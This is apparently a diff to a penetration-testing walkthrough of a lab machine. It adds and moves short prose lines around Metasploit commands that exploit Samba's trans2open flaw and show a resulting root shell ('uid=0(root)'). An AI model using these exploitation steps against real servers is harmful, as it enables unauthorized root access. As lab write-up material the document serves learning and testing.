@@ -87,6 +87,8 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 26.11 seconds
 ```
 
+let's explore.
+
 ---
 
 ### http explore
@@ -525,7 +527,8 @@ i use payload 34, then try agin.
 set payload 34
 run
 ```
-success.
+
+now, i'm root.
 
 ```
 msf exploit(linux/samba/trans2open) > set payload 34
@@ -565,5 +568,3 @@ uid=0(root) gid=0(root) groups=99(nobody)
 whoami
 root
 ```
-
-now, i'm root.
